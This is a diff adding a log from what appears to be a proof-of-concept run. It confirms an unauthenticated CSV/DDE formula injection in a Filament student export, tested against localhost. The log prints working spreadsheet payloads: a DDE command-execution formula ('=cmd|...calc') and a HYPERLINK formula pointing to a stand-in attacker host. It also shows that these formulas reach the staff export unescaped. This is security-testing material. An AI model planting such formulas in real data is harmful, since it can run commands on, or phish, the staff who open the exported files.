@@ -1,0 +1,14 @@
+========================================================================
+VULN-006: CSV/DDE formula injection in Filament Student export
+target: http://localhost:20000
+[INFO] exercising vulnerable code path: StudentExporter columns written to CSV with no formula-prefix neutralization
+========================================================================
+[STEP] unauth: register a student whose lastname and idnumber are spreadsheet formulas
+[SETUP] registered csv_a96d3ef9@example.invalid; stored lastname = '=HYPERLINK("HTTP://EVIL.TLD/A96D3EF9","CLICKME")' (leading '=' preserved)
+[STEP] admin: trigger the Students CSV export and drain the export queue
+[INFO] export action HTTP 200; queue drained
+[STEP] reading the generated CSV back from the server to inspect the attacker's row
+[INFO] attacker row in export CSV: '"=cmd|\'/c calc\'!A0","=HYPERLINK(""HTTP://EVIL.TLD/A96D3EF9"",""CLICKME"")",Csva96D3Ef9,csv_a96d3ef9@example.invalid,"26 years old",'
+[PROOF] the export CSV contains the attacker's row with cells that begin with a formula character (=HYPERLINK ... and =cmd|...), unescaped — Excel/LibreOffice will treat them as formulas when the staff member opens the file
+[OK] exploit confirmed — unauthenticated CSV/DDE formula injection into staff exports
+==> VULN-006: CONFIRMED — anon registration plants live spreadsheet formulas into the Student CSV export, unescaped
